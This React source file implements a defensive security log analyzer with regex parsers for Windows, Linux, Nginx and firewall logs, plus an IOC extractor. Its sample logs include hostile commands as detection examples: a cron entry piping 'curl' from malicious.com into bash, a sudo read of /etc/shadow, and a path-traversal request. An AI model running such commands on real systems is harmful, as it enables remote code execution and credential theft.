'use client'

import React, { useState } from 'react'
import { copyToClipboard } from '@/lib/utils'

interface LogPattern {
  name: string
  regex: string
  example: string
  fields: string[]
  description: string
}

const LOG_PATTERNS: Record<string, LogPattern[]> = {
  'Windows Event Logs': [
    {
      name: 'Security Event (4624 - Successful Logon)',
      regex: `(?<date>\\d{2}/\\d{2}/\\d{4}) (?<time>\\d{2}:\\d{2}:\\d{2}) (?<provider>Microsoft-Windows-Security-Auditing) (?<eventid>\\d+) (?<user>[\\w\\\\.-]+)`,
      example: `An account was successfully logged on.
Subject:
  Security ID: SYSTEM
  Account Name: WIN-PC01$
  Account Domain: WORKGROUP
Logon Information:
  Logon Type: 3
  Impersonation Level: Impersonation
New Logon:
  Account Name: john.smith
  Account Domain: CORP
  Logon ID: 0x1234567
Network Information:
  Workstation Name: REMOTE-PC
  Source Network Address: 192.168.1.105
  Source Port: 54321`,
      fields: ['Security ID', 'Account Name', 'Logon Type', 'Source Network Address', 'Source Port'],
      description: 'Windows successful logon event - key for detecting unauthorized access',
    },
    {
      name: 'Security Event (4625 - Failed Logon)',
      regex: `EventID:\\s*4625.*Account Name:\\s*(?<user>[\\w\\\\@.-]+).*Source Network Address:\\s*(?<src_ip>[\\d.]+)`,
      example: `An account failed to log on.
Account Information:
  Account Name: administrator
  Account Domain: CORP
Failure Information:
  Failure Reason: Unknown user name or bad password.
  Status: 0xC000006D
  Sub Status: 0xC0000064
Network Information:
  Workstation Name: ATTACKER-PC
  Source Network Address: 10.0.0.55
  Source Port: 49732`,
      fields: ['Account Name', 'Failure Reason', 'Source Network Address', 'Status Code'],
      description: 'Failed logon - high volume indicates brute force or password spray',
    },
    {
      name: 'Process Creation (4688)',
      regex: `New Process Name:\\s*(?<process>[^\\n]+).*Creator Process Name:\\s*(?<parent>[^\\n]+).*Process Command Line:\\s*(?<cmdline>[^\\n]+)`,
      example: `A new process has been created.
Creator Subject:
  Account Name: john.smith
  Account Domain: CORP
Process Information:
  New Process ID: 0x1a2b
  New Process Name: C:\\Windows\\System32\\cmd.exe
  Creator Process Name: C:\\Windows\\explorer.exe
  Process Command Line: cmd.exe /c whoami && net user`,
      fields: ['New Process Name', 'Creator Process Name', 'Process Command Line', 'Account Name'],
      description: 'Process creation - critical for detecting malicious command execution',
    },
  ],
  'Linux/Syslog': [
    {
      name: 'SSH Authentication',
      regex: `(?<date>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+) (?<host>[\\w.-]+) sshd\\[(?<pid>\\d+)\\]: (?<status>Accepted|Failed) (?<method>\\w+) for (?<user>\\w+) from (?<src_ip>[\\d.]+) port (?<port>\\d+)`,
      example: `Jan 15 14:23:01 webserver01 sshd[1234]: Accepted publickey for admin from 192.168.1.50 port 22
Jan 15 14:24:15 webserver01 sshd[1235]: Failed password for root from 10.0.0.55 port 43210
Jan 15 14:24:16 webserver01 sshd[1236]: Failed password for root from 10.0.0.55 port 43211`,
      fields: ['date', 'host', 'status', 'method', 'user', 'src_ip', 'port'],
      description: 'SSH login attempts - monitor for failed auth from external IPs',
    },
    {
      name: 'Sudo Command Execution',
      regex: `(?<date>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+) (?<host>[\\w.-]+) sudo:\\s+(?<user>[\\w.-]+) : .+ COMMAND=(?<command>[^\\n]+)`,
      example: `Jan 15 15:30:00 webserver01 sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
Jan 15 15:31:00 webserver01 sudo: john : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow`,
      fields: ['date', 'host', 'user', 'command'],
      description: 'Sudo execution - track privilege escalation on Linux',
    },
    {
      name: 'Cron Job Execution',
      regex: `(?<date>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+) (?<host>[\\w.-]+) CRON\\[(?<pid>\\d+)\\]: \\((?<user>[\\w]+)\\) CMD \\((?<command>[^)]+)\\)`,
      example: `Jan 15 02:00:01 server01 CRON[5678]: (root) CMD (/usr/local/bin/backup.sh)
Jan 15 03:15:00 server01 CRON[5679]: (www-data) CMD (curl http://malicious.com/update.sh | bash)`,
      fields: ['date', 'host', 'user', 'command'],
      description: 'Cron job execution - monitor for malicious persistence via cron',
    },
  ],
  'Web Server / Nginx': [
    {
      name: 'Nginx Access Log',
      regex: `(?<src_ip>[\\d.]+) - (?<user>[\\w-]+) \\[(?<date>[^\\]]+)\\] "(?<method>\\w+) (?<path>[^ ]+) (?<proto>[^"]+)" (?<status>\\d+) (?<bytes>\\d+) "(?<referer>[^"]+)" "(?<ua>[^"]+)"`,
      example: `192.168.1.100 - - [15/Jan/2024:14:30:01 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
10.0.0.55 - - [15/Jan/2024:14:30:02 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "python-requests/2.28"
192.168.1.1 - - [15/Jan/2024:14:30:03 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 0 "-" "nmap-scanner"`,
      fields: ['src_ip', 'method', 'path', 'status', 'bytes', 'user_agent'],
      description: 'Web access logs - detect scanning, path traversal, brute force',
    },
    {
      name: 'Nginx Error Log',
      regex: `(?<date>\\d{4}/\\d{2}/\\d{2} \\d{2}:\\d{2}:\\d{2}) \\[(?<level>\\w+)\\] (?<pid>\\d+)#\\d+: (?<message>.+)`,
      example: `2024/01/15 14:30:01 [error] 1234#0: *1 connect() failed (111: Connection refused) while connecting to upstream
2024/01/15 14:30:02 [warn] 1235#0: *2 client sent invalid method while reading client request line
2024/01/15 14:30:03 [error] 1236#0: *3 rewrite or internal redirection cycle`,
      fields: ['date', 'level', 'pid', 'message'],
      description: 'Nginx errors - useful for detecting configuration issues and attacks',
    },
  ],
  'Firewall/Network': [
    {
      name: 'Cisco ASA Firewall',
      regex: `%ASA-(?<level>\\d)-(?<msgid>\\d+): (?<action>Built|Teardown|Denied) (?<proto>\\w+) connection .* from (?<src>[\\d.]+):(?<sport>\\d+) to (?<dst>[\\d.]+):(?<dport>\\d+)`,
      example: `%ASA-6-302013: Built outbound TCP connection 12345 for outside:8.8.8.8/53 to inside:192.168.1.100/54321
%ASA-4-106023: Deny tcp src outside:10.0.0.55/44321 dst inside:192.168.1.1/22 by access-group "OUTSIDE_IN"
%ASA-5-304001: 192.168.1.50 Accessed URL 192.168.100.1:/malware.exe`,
      fields: ['level', 'msgid', 'action', 'proto', 'src', 'dst', 'dport'],
      description: 'Cisco ASA logs - track allowed/denied connections',
    },
    {
      name: 'Windows Firewall (netsh)',
      regex: `(?<date>\\d{4}-\\d{2}-\\d{2}) (?<time>\\d{2}:\\d{2}:\\d{2}) (?<action>ALLOW|DROP|INFO) (?<proto>\\w+) (?<src>[\\d.]+) (?<dst>[\\d.]+) (?<sport>\\d+) (?<dport>\\d+)`,
      example: `2024-01-15 14:30:01 ALLOW TCP 192.168.1.100 10.0.0.1 54321 443
2024-01-15 14:30:02 DROP UDP 10.0.0.55 192.168.1.100 53421 4444
2024-01-15 14:30:03 ALLOW ICMP 192.168.1.1 10.0.0.1 - -`,
      fields: ['date', 'time', 'action', 'proto', 'src', 'dst', 'sport', 'dport'],
      description: 'Windows Firewall log - detect blocked connection attempts',
    },
  ],
}

const IOC_REGEX_PATTERNS = [
  { name: 'IPv4 Address', pattern: '\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b' },
  { name: 'IPv6 Address', pattern: '\\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\\b|\\b(?:[0-9a-fA-F]{1,4}:)*:(?:[0-9a-fA-F]{1,4}:)*[0-9a-fA-F]{1,4}\\b' },
  { name: 'Domain Name', pattern: '\\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}\\b' },
  { name: 'URL (HTTP/HTTPS)', pattern: 'https?://(?:[\\w.-]+)(?:/[^\\s"\'<>]*)?' },
  { name: 'Email Address', pattern: '[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}' },
  { name: 'MD5 Hash', pattern: '\\b[a-fA-F0-9]{32}\\b' },
  { name: 'SHA-1 Hash', pattern: '\\b[a-fA-F0-9]{40}\\b' },
  { name: 'SHA-256 Hash', pattern: '\\b[a-fA-F0-9]{64}\\b' },
  { name: 'CVE Identifier', pattern: 'CVE-\\d{4}-\\d{4,7}' },
  { name: 'Windows Registry Key', pattern: 'HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)(?:\\\\[^\\s]+)+' },
  { name: 'File Path (Windows)', pattern: '[A-Za-z]:\\\\(?:[^\\\\/:*?"<>|\\r\\n]+\\\\)*[^\\\\/:*?"<>|\\r\\n]*' },
  { name: 'File Path (Linux)', pattern: '/(?:[\\w.-]+/)*[\\w.-]+' },
  { name: 'Base64 Data (suspicious)', pattern: '[A-Za-z0-9+/]{30,}={0,2}' },
  { name: 'Port Number', pattern: '\\b(?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})\\b' },
]

export default function LogAnalysis() {
  const [logInput, setLogInput] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('Windows Event Logs')
  const [selectedPattern, setSelectedPattern] = useState(0)
  const [extractedIOCs, setExtractedIOCs] = useState<{ type: string; values: string[] }[]>([])
  const [activeTab, setActiveTab] = useState<'analyzer' | 'patterns' | 'ioc-extractor'>('analyzer')
  const [parsed, setParsed] = useState<Record<string, string>>({})
  const [copied, setCopied] = useState('')

  const copy = async (text: string, key: string) => {
    await copyToClipboard(text)
    setCopied(key)
    setTimeout(() => setCopied(''), 1500)
  }

  const parseLog = () => {
    const pattern = LOG_PATTERNS[selectedCategory]?.[selectedPattern]
    if (!pattern || !logInput.trim()) return
    try {
      const rx = new RegExp(pattern.regex, 'i')
      const match = rx.exec(logInput)
      if (match?.groups) {
        setParsed(match.groups as Record<string, string>)
      } else {
        setParsed({ error: 'Pattern did not match. Try different log format.' })
      }
    } catch {
      setParsed({ error: 'Invalid regex pattern' })
    }
  }

  const extractIOCs = () => {
    if (!logInput.trim()) return
    const results: { type: string; values: string[] }[] = []
    for (const p of IOC_REGEX_PATTERNS) {
      try {
        const rx = new RegExp(p.pattern, 'gi')
        const matches = Array.from(new Set(logInput.match(rx) || []))
        if (matches.length > 0) {
          results.push({ type: p.name, values: matches.slice(0, 50) })
        }
      } catch {}
    }
    setExtractedIOCs(results)
  }

  const categories = Object.keys(LOG_PATTERNS)
  const currentPattern = LOG_PATTERNS[selectedCategory]?.[selectedPattern]

  return (
    <div className="space-y-5">
      <div>
        <h2 className="section-heading">Log Analysis</h2>
        <p className="section-subheading">Parse security logs, extract IOCs, and analyze log patterns</p>
      </div>

      <div className="flex gap-2">
        {(['analyzer', 'patterns', 'ioc-extractor'] as const).map(t => (
          <button key={t} onClick={() => setActiveTab(t)} className={`tab-btn ${activeTab === t ? 'active' : ''}`}>
            {t === 'analyzer' ? '🔍 Log Analyzer' : t === 'patterns' ? '📋 Log Patterns' : '🔎 IOC Extractor'}
          </button>
        ))}
      </div>

      {activeTab === 'analyzer' && (
        <div className="space-y-4">
          {/* Category and pattern selection */}
          <div className="card">
            <div className="card-header"><span className="card-title">Select Log Format</span></div>
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-gray-400 mb-1 block">Log Category</label>
                <select className="cyber-select w-full" value={selectedCategory} onChange={e => { setSelectedCategory(e.target.value); setSelectedPattern(0) }}>
                  {categories.map(c => <option key={c} value={c}>{c}</option>)}
                </select>
              </div>
              <div>
                <label className="text-xs text-gray-400 mb-1 block">Pattern</label>
                <select className="cyber-select w-full" value={selectedPattern} onChange={e => setSelectedPattern(Number(e.target.value))}>
                  {(LOG_PATTERNS[selectedCategory] || []).map((p, i) => (
                    <option key={i} value={i}>{p.name}</option>
                  ))}
                </select>
              </div>
            </div>
            {currentPattern && (
              <div className="mt-3 p-3 rounded" style={{ background: 'rgba(0,212,255,0.04)', border: '1px solid rgba(0,212,255,0.1)' }}>
                <div className="text-xs text-gray-400 mb-1">{currentPattern.description}</div>
                <div className="text-xs text-gray-500">Fields: {currentPattern.fields.join(', ')}</div>
              </div>
            )}
          </div>

          {/* Log input */}
          <div className="card">
            <div className="card-header">
              <span className="card-title">Log Input</span>
              {currentPattern && (
                <button onClick={() => setLogInput(currentPattern.example)} className="ml-auto text-xs text-blue-400 hover:underline">Load Example</button>
              )}
            </div>
            <textarea
              className="cyber-textarea w-full h-40 text-xs"
              value={logInput}
              onChange={e => setLogInput(e.target.value)}
              placeholder="Paste your log entry here..."
            />
            <div className="flex gap-2 mt-3">
              <button onClick={parseLog} disabled={!logInput.trim()} className="btn-primary disabled:opacity-50">Parse Log</button>
              <button onClick={() => setLogInput('')} className="btn-danger">Clear</button>
            </div>
          </div>

          {/* Parsed output */}
          {Object.keys(parsed).length > 0 && (
            <div className="card">
              <div className="flex items-center justify-between mb-3">
                <span className="card-title">Parsed Fields</span>
                <button onClick={() => copy(JSON.stringify(parsed, null, 2), 'parsed')} className="btn-primary text-xs py-1">
                  {copied === 'parsed' ? '✓ Copied' : 'Copy JSON'}
                </button>
              </div>
              <div className="space-y-1">
                {Object.entries(parsed).map(([k, v]) => (
                  <div key={k} className="flex items-start gap-2 py-1.5 border-b" style={{ borderColor: 'rgba(0,212,255,0.06)' }}>
                    <span className="text-xs text-gray-500 w-32 shrink-0">{k}</span>
                    <span className="text-xs font-mono text-gray-200 break-all">{v}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {activeTab === 'patterns' && (
        <div className="space-y-4">
          {categories.map(cat => (
            <div key={cat} className="card">
              <div className="card-header"><span className="card-title">{cat}</span></div>
              <div className="space-y-4">
                {LOG_PATTERNS[cat].map((p, i) => (
                  <div key={i}>
                    <div className="text-xs font-semibold text-blue-300 mb-1">{p.name}</div>
                    <div className="text-xs text-gray-500 mb-2">{p.description}</div>
                    <div className="text-xs text-gray-400 mb-1">Fields: <span className="text-blue-400">{p.fields.join(', ')}</span></div>
                    <div className="text-xs text-gray-400 mb-1">Regex:</div>
                    <div className="flex gap-2">
                      <pre className="code-block text-xs flex-1 overflow-x-auto">{p.regex}</pre>
                      <button onClick={() => copy(p.regex, `rx-${cat}-${i}`)} className="btn-primary text-xs py-1 h-fit">{copied === `rx-${cat}-${i}` ? '✓' : '⧉'}</button>
                    </div>
                    <div className="text-xs text-gray-400 mt-2 mb-1">Example:</div>
                    <pre className="code-block text-xs overflow-x-auto whitespace-pre-wrap">{p.example}</pre>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}

      {activeTab === 'ioc-extractor' && (
        <div className="space-y-4">
          <div className="card">
            <div className="card-header"><span className="card-title">IOC Extractor</span></div>
            <p className="text-xs text-gray-500 mb-3">Paste logs, emails, or any text to automatically extract IOCs (IPs, domains, hashes, URLs, etc.)</p>
            <textarea
              className="cyber-textarea w-full h-40 text-xs"
              value={logInput}
              onChange={e => setLogInput(e.target.value)}
              placeholder="Paste any text containing potential IOCs..."
            />
            <div className="flex gap-2 mt-3">
              <button onClick={extractIOCs} disabled={!logInput.trim()} className="btn-primary disabled:opacity-50">🔎 Extract IOCs</button>
              <button onClick={() => { setLogInput(''); setExtractedIOCs([]) }} className="btn-danger">Clear</button>
            </div>
          </div>

          {extractedIOCs.length > 0 && (
            <div className="space-y-3">
              {extractedIOCs.map((group, i) => (
                <div key={i} className="card">
                  <div className="flex items-center justify-between mb-2">
                    <span className="card-title">{group.type} ({group.values.length})</span>
                    <button onClick={() => copy(group.values.join('\n'), `ioc-group-${i}`)} className="btn-primary text-xs py-1">
                      {copied === `ioc-group-${i}` ? '✓ Copied' : 'Copy All'}
                    </button>
                  </div>
                  <div className="flex flex-wrap gap-1">
                    {group.values.map((v, j) => (
                      <button key={j} onClick={() => copy(v, `ioc-val-${i}-${j}`)} className="font-mono text-xs px-2 py-1 rounded hover:bg-blue-500/20 transition-colors" style={{ background: 'rgba(0,212,255,0.06)', border: '1px solid rgba(0,212,255,0.1)', color: '#c8d6e5' }}>
                        {v}
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Regex reference */}
          <div className="card">
            <div className="card-header"><span className="card-title">IOC Regex Patterns Reference</span></div>
            <div className="space-y-2">
              {IOC_REGEX_PATTERNS.map((p, i) => (
                <div key={i} className="flex items-center gap-2 py-1.5 border-b" style={{ borderColor: 'rgba(0,212,255,0.06)' }}>
                  <span className="text-xs text-blue-400 w-36 shrink-0">{p.name}</span>
                  <span className="text-xs font-mono text-gray-400 flex-1 truncate">{p.pattern}</span>
                  <button onClick={() => copy(p.pattern, `rx-ioc-${i}`)} className="text-xs text-gray-500 hover:text-blue-400 shrink-0">
                    {copied === `rx-ioc-${i}` ? '✓' : '⧉'}
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
